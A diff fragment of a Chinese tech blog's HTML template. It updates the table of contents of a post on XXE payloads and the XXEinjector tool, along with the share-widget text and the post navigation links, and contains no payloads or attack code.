+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、XXE-Payload-Cheatsheet"><span class="toc-number">1.</span> <span class="toc-text">一、XXE Payload Cheatsheet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、XXEinjector工具"><span class="toc-number">2.</span> <span class="toc-text">二、XXEinjector工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-XXEinjector概述"><span class="toc-number">2.1.</span> <span class="toc-text">0x00 XXEinjector概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-基本重要参数使用方法"><span class="toc-number">2.2.</span> <span class="toc-text">0x01 基本重要参数使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-使用实例"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 使用实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-XXE学习资源"><span class="toc-number">3.</span> <span class="toc-text">0x03 XXE学习资源</span></a></li></ol>
         
     </div>
     <style>
@@ -457,7 +440,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"XML基本知识学习　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"XXE漏洞利用工具及其资源　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -477,15 +460,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/01/XXE/" title="上一篇: XXE（XML External Entity）漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/02/28/文件与目录权限/" title="下一篇: 文件与目录权限">
+            <a href="/2019/03/01/XXE/" title="下一篇: XXE（XML External Entity）漏洞">
                 <i class="fa fa-angle-right"></i>
             </a>
         
